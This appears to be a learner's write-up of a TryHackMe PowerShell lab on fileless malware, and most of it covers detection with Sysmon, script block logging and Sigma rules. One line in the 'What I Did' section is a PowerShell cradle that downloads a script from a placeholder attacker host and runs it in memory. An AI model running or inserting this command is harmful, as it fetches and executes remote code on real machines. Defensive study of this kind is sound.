Scenario 1: Fileless Malware with PowerShell – Spear-phishing leads to a malicious PowerShell payload executing remotely
Room Used: TryHackMe – Windows PowerShell Basics
Link: https://tryhackme.com/room/powershellbasics

Objective:
The objective of this room was to understand how PowerShell can be abused by attackers to execute malicious commands directly in memory, making detection difficult. It aligns with real-world fileless malware attacks where the payload never touches disk and is executed via encoded or obfuscated PowerShell commands.

What I Did:

Explored PowerShell scripting and command-line execution using practical labs.

Simulated execution of obfuscated PowerShell payloads (e.g., Base64 encoded strings using Invoke-Expression).

Understood how attackers use PowerShell remoting to execute code on remote machines without dropping files.

Emulated techniques where commands are downloaded and executed via memory using:

powershell
Copy
Edit
iex (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
Detection Strategy:

Enabled and monitored Sysmon Event ID 1 (Process Creation) to capture powershell.exe execution.

Looked for suspicious command-line flags like -EncodedCommand and keywords like IEX, FromBase64String.

Enabled PowerShell Script Block Logging (Event ID 4104) to detect hidden or obfuscated scripts executed in memory.

Created Sigma rule to flag base64 or encoded strings in PowerShell script block logs.

Tools Used:

Sysmon

ELK Stack (for visualization)

Sigma rules (custom rules for detecting encoded PowerShell commands)

PowerShell logging and Event Viewer

Conclusion:
This room effectively demonstrated how PowerShell can be used as a powerful tool for fileless attacks. Detecting such attacks requires deep monitoring of script execution in memory and careful analysis of command-line arguments. By simulating the same techniques used by APTs, I learned how to correlate PowerShell activity with malicious behavior and write detection rules accordingly.
